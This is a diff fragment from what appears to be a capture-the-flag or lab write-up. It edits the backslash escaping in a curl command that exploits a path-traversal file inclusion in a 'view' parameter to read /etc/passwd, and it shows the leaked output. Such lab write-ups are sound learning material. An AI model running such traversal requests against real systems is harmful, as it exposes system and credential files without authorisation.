@@ -145,7 +145,7 @@ We notice that the entry URL of the page is: `...?view=about-us.html`, which mig
 To test our theory, we can use `curl`.
 
 ```bash
-$ curl -s http://192.168.12.10/development/index.php\?view=../../../../../../../etc/passwd
+$ curl -s http://192.168.12.10/development/index.php\\?view=../../../../../../../etc/passwd
 [...]
 <p>root:x:0:0:root:/root:/bin/bash
 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
